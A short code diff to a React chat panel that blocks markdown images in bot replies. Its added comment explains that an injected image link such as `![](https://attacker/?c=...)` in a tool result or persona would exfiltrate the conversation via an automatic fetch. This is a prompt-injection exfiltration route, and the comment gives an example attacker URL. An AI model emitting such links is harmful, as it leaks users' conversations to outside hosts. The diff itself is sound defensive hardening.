@@ -190,7 +190,13 @@ export function ChatPanel() {
                 {(turn.phase === "answering" || turn.phase === "done") && (
                   <div className="bubble bot">
                     <div className="md">
-                      <ReactMarkdown skipHtml>{turn.text}</ReactMarkdown>
+                      {/* skipHtml stops raw HTML, but NOT markdown images. An image is
+                          fetched with no click, so `![](https://attacker/?c=...)` in a
+                          tool result or persona would exfiltrate the conversation. The
+                          bot has no reason to emit images, so drop them entirely. */}
+                      <ReactMarkdown skipHtml disallowedElements={["img"]}>
+                        {turn.text}
+                      </ReactMarkdown>
                     </div>
                   </div>
                 )}
